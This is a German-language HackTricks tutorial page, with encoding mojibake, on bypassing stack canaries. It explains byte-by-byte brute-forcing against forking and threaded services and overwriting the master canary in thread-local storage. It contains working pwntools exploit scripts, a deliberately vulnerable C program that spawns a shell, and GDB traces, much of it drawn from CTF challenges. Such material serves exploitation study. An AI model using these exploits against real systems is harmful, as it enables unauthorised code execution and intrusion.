# BF Forked & Threaded Stack Canaries

{% hint style="success" %}
Lerne & √ºbe AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Lerne & √ºbe GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterst√ºtze HackTricks</summary>

* √úberpr√ºfe die [**Abonnementpl√§ne**](https://github.com/sponsors/carlospolop)!
* **Tritt der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folge** uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teile Hacking-Tricks, indem du PRs zu den** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos einreichst.

</details>
{% endhint %}

**Wenn du es mit einer bin√§ren Datei zu tun hast, die durch einen Canary und PIE (Position Independent Executable) gesch√ºtzt ist, musst du wahrscheinlich einen Weg finden, diese zu umgehen.**

![](<../../../../.gitbook/assets/image (144).png>)

{% hint style="info" %}
Beachte, dass **`checksec`** m√∂glicherweise nicht erkennt, dass eine bin√§re Datei durch einen Canary gesch√ºtzt ist, wenn diese statisch kompiliert wurde und die Funktion nicht identifizieren kann.\
Du kannst dies jedoch manuell feststellen, wenn du bemerkst, dass ein Wert zu Beginn eines Funktionsaufrufs im Stack gespeichert wird und dieser Wert vor dem Verlassen √ºberpr√ºft wird.
{% endhint %}

## Brute Force Canary

Der beste Weg, einen einfachen Canary zu umgehen, ist, wenn die bin√§re Datei ein Programm ist, das **bei jeder neuen Verbindung** mit ihm (Netzwerkdienst) **Kindprozesse forked**, da bei jeder Verbindung **der gleiche Canary verwendet wird**.

Der beste Weg, den Canary zu umgehen, besteht dann darin, ihn einfach **Zeichen f√ºr Zeichen zu brute-forcen**, und du kannst herausfinden, ob das erratene Canary-Byte korrekt war, indem du √ºberpr√ºfst, ob das Programm abgest√ºrzt ist oder seinen regul√§ren Ablauf fortsetzt. In diesem Beispiel **brute-forced die Funktion einen 8-Byte-Canary (x64)** und unterscheidet zwischen einem korrekt erratenen Byte und einem schlechten Byte, indem sie einfach **√ºberpr√ºft**, ob eine **Antwort** vom Server zur√ºckgesendet wird (eine andere M√∂glichkeit in **anderen Situationen** k√∂nnte die Verwendung von **try/except** sein):

### Beispiel 1

Dieses Beispiel ist f√ºr 64-Bit implementiert, k√∂nnte aber leicht f√ºr 32-Bit implementiert werden.
```python
from pwn import *

def connect():
r = remote("localhost", 8788)

def get_bf(base):
canary = ""
guess = 0x0
base += canary

while len(canary) < 8:
while guess != 0xff:
r = connect()

r.recvuntil("Username: ")
r.send(base + chr(guess))

if "SOME OUTPUT" in r.clean():
print "Guessed correct byte:", format(guess, '02x')
canary += chr(guess)
base += chr(guess)
guess = 0x0
r.close()
break
else:
guess += 1
r.close()

print "FOUND:\\x" + '\\x'.join("{:02x}".format(ord(c)) for c in canary)
return base

canary_offset = 1176
base = "A" * canary_offset
print("Brute-Forcing canary")
base_canary = get_bf(base) #Get yunk data + canary
CANARY = u64(base_can[len(base_canary)-8:]) #Get the canary
```
### Beispiel 2

Dies ist f√ºr 32 Bit implementiert, kann jedoch leicht auf 64 Bit ge√§ndert werden.\
Beachten Sie auch, dass das **Programm zun√§chst ein Byte erwartet, um die Gr√∂√üe der Eingabe** und die Nutzlast anzuzeigen.
```python
from pwn import *

# Here is the function to brute force the canary
def breakCanary():
known_canary = b""
test_canary = 0x0
len_bytes_to_read = 0x21

for j in range(0, 4):
# Iterate up to 0xff times to brute force all posible values for byte
for test_canary in range(0xff):
print(f"\rTrying canary: {known_canary} {test_canary.to_bytes(1, 'little')}", end="")

# Send the current input size
target.send(len_bytes_to_read.to_bytes(1, "little"))

# Send this iterations canary
target.send(b"0"*0x20 + known_canary + test_canary.to_bytes(1, "little"))

# Scan in the output, determine if we have a correct value
output = target.recvuntil(b"exit.")
if b"YUM" in output:
# If we have a correct value, record the canary value, reset the canary value, and move on
print(" - next byte is: " + hex(test_canary))
known_canary = known_canary + test_canary.to_bytes(1, "little")
len_bytes_to_read += 1
break

# Return the canary
return known_canary

# Start the target process
target = process('./feedme')
#gdb.attach(target)

# Brute force the canary
canary = breakCanary()
log.info(f"The canary is: {canary}")
```
## Threads

Threads desselben Prozesses werden auch **das gleiche Canary-Token teilen**, daher wird es m√∂glich sein, ein Canary zu **brute-forcen**, wenn die Binary bei jedem Angriff einen neuen Thread erzeugt.&#x20;

Ein Buffer Overflow in einer threaded Funktion, die mit einem Canary gesch√ºtzt ist, kann verwendet werden, um das Master-Canary des Prozesses zu modifizieren. Infolgedessen ist die Minderung nutzlos, da die √úberpr√ºfung mit zwei Canaries verwendet wird, die gleich sind (obwohl modifiziert).

### Beispiel

Das folgende Programm ist anf√§llig f√ºr Buffer Overflow, aber es wird mit Canary kompiliert:
```c
#include <pthread.h>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>

// gcc thread_canary.c -no-pie -l pthread -o thread_canary

void win() {
execve("/bin/sh", NULL, NULL);
}

void* vuln() {
char data[0x20];
gets(data);
}

int main() {
pthread_t thread;

pthread_create(&thread, NULL, vuln, NULL);
pthread_join(thread, NULL);

return 0;
}
```
Beachten Sie, dass `vuln` innerhalb eines Threads aufgerufen wird. In GDB k√∂nnen wir uns `vuln` ansehen, insbesondere an dem Punkt, an dem das Programm `gets` aufruft, um Eingabedaten zu lesen:
```bash
gef> break gets
Breakpoint 1 at 0x4010a0
gef> run
...
gef> x/10gx $rdi
0x7ffff7d7ee20: 0x0000000000000000      0x0000000000000000
0x7ffff7d7ee30: 0x0000000000000000      0x0000000000000000
0x7ffff7d7ee40: 0x0000000000000000      0x493fdc653a156800
0x7ffff7d7ee50: 0x0000000000000000      0x00007ffff7e17ac3
0x7ffff7d7ee60: 0x0000000000000000      0x00007ffff7d7f640
```
Die obigen Angaben repr√§sentieren die Adresse von `data`, wo das Programm Benutzereingaben schreiben wird. Der Stack-Canary befindet sich bei `0x7ffff7d7ee48` (`0x493fdc653a156800`), und die R√ºcksprungadresse ist bei `0x7ffff7d7ee50` (`0x00007ffff7e17ac3`):
```bash
gef> telescope $rdi 8 -n
0x7ffff7d7ee20|+0x0000|+000: 0x0000000000000000  <-  $rdi
0x7ffff7d7ee28|+0x0008|+001: 0x0000000000000000
0x7ffff7d7ee30|+0x0010|+002: 0x0000000000000000
0x7ffff7d7ee38|+0x0018|+003: 0x0000000000000000
0x7ffff7d7ee40|+0x0020|+004: 0x0000000000000000
0x7ffff7d7ee48|+0x0028|+005: 0x493fdc653a156800  <-  canary
0x7ffff7d7ee50|+0x0030|+006: 0x0000000000000000  <-  $rbp
0x7ffff7d7ee58|+0x0038|+007: 0x00007ffff7e17ac3 <start_thread+0x2f3>  ->  0xe8ff31fffffe6fe9  <-  retaddr[2]
```
Beachten Sie, dass die Stack-Adressen nicht zum tats√§chlichen Stack geh√∂ren:
```bash
gef> vmmap stack
[ Legend:  Code | Heap | Stack | Writable | ReadOnly | None | RWX ]
Start              End                Size               Offset             Perm Path
0x00007ffff7580000 0x00007ffff7d83000 0x0000000000803000 0x0000000000000000 rw- <tls-th1><stack-th2>  <-  $rbx, $rsp, $rbp, $rsi, $rdi, $r12
0x00007ffffffde000 0x00007ffffffff000 0x0000000000021000 0x0000000000000000 rw- [stack]  <-  $r9, $r15
```
Der Stack des Threads wird √ºber dem Thread Local Storage (TLS) platziert, wo der Master-Cap gespeichert ist:
```bash
gef> tls
$tls = 0x7ffff7d7f640
...
---------------------------------------------------------------------------- TLS ----------------------------------------------------------------------------
0x7ffff7d7f640|+0x0000|+000: 0x00007ffff7d7f640  ->  [loop detected]  <-  $rbx, $r12
0x7ffff7d7f648|+0x0008|+001: 0x00000000004052b0  ->  0x0000000000000001
0x7ffff7d7f650|+0x0010|+002: 0x00007ffff7d7f640  ->  [loop detected]
0x7ffff7d7f658|+0x0018|+003: 0x0000000000000001
0x7ffff7d7f660|+0x0020|+004: 0x0000000000000000
0x7ffff7d7f668|+0x0028|+005: 0x493fdc653a156800  <-  canary
0x7ffff7d7f670|+0x0030|+006: 0xb79b79966e9916c4  <-  PTR_MANGLE cookie
0x7ffff7d7f678|+0x0038|+007: 0x0000000000000000
...
```
{% hint style="info" %}
Einige der oben genannten GDB-Funktionen sind in einer Erweiterung namens [bata24/gef](https://github.com/bata24/gef) definiert, die mehr Funktionen als das √ºbliche [hugsy/gef](https://github.com/hugsy/gef) bietet.
{% endhint %}

Infolgedessen kann ein gro√üer Buffer Overflow sowohl den Stack-Cookie als auch den Master-Cookie im TLS modifizieren. Dies ist der Offset:
```bash
gef> p/x 0x7ffff7d7f668 - $rdi
$1 = 0x848
```
Dies ist ein kurzer Exploit, um `win` aufzurufen:
```python
from pwn import *

context.binary = 'thread_canary'

payload  = b'A' * 0x28                    # buffer overflow offset
payload += b'BBBBBBBB'                    # overwritting stack canary
payload += b'A' * 8                       # saved $rbp
payload += p64(context.binary.sym.win)    # return address
payload += b'A' * (0x848 - len(payload))  # padding
payload += b'BBBBBBBB'                    # overwritting master canary

io = context.binary.process()
io.sendline(payload)
io.interactive()
```
## Weitere Beispiele & Referenzen

* [https://guyinatuxedo.github.io/07-bof\_static/dcquals16\_feedme/index.html](https://guyinatuxedo.github.io/07-bof\_static/dcquals16\_feedme/index.html)
* 64 Bit, kein PIE, nx, BF Canary, schreibe in einen Speicher einen ROP, um `execve` aufzurufen und dorthin zu springen.
* [http://7rocky.github.io/en/ctf/htb-challenges/pwn/robot-factory/#canaries-and-threads](http://7rocky.github.io/en/ctf/htb-challenges/pwn/robot-factory/#canaries-and-threads)
* 64 Bit, kein PIE, nx, modifiziere Thread und Master Canary.
